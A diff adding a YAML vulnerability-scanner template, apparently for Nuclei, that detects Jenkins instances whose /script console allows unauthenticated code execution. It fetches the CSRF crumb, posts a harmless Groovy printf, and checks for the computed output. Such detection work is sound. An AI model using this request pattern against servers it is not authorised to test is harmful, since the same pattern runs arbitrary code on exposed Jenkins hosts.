@@ -1,0 +1,51 @@
+id: jenkins-unauthorized-access
+
+info:
+  name: Jenkins Unauthorized Script Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template identifies unauthorized access and script execution issues in Jenkins instances by leveraging the `/script` endpoint.
+
+variables:
+  r1: "{{rand_int(1000, 9999)}}"
+  r2: "{{rand_int(1000, 9999)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: r0
+    method: GET
+    path:
+      - "{{BaseURL}}/script"
+    redirects: false
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: jenkins_crumb
+        group: 1
+        internal: true
+        regex:
+          - '\"Jenkins-Crumb\", \"(?P<var>.+?)\"\);'
+
+  - id: r1
+    method: POST
+    path:
+      - "{{BaseURL}}/script"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      script=printf%28%27{{r1}}%25%25{{r2}}%27%29%3B&Jenkins-Crumb={{jenkins_crumb}}&Submit=%E8%BF%90%E8%A1%8C
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{r1}}%{{r2}}"
+        part: body
